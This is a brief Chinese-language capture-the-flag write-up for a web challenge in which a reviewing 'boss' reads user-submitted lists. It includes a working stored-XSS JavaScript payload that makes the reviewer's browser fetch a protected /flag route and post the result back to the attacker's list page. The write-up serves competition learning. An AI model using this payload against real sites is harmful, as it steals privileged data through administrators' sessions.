# 解题步骤（WriteUp）

第一步：使用浏览器访问赛题环境 [http://0192d6262ea37831bc782232dda15010.y4op.dg04.ciihw.cn:43811/](http://0192d6262ea37831bc782232dda15010.y4op.dg04.ciihw.cn:43811/)

![[Pasted image 20241029114729.png]]

第二步：输入任意用户名密码开一个新的list

同时发现`/flag`路由，只有boss能访问

第三步：有boss审核，猜测存在XSS

尝试发现机子不出网，直接向list页面post信息，获取flag

```js
<script>
        var url = document.location.href;
        fetch("http://127.0.0.1:5000/flag").then(resp => resp.text()).then((flag) => {
            var xhr = new XMLHttpRequest();
            xhr.open("POST", url, true);
            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
            xhr.send("content=" + flag);
        });
</script>

```

![[Pasted image 20241029114758.png]]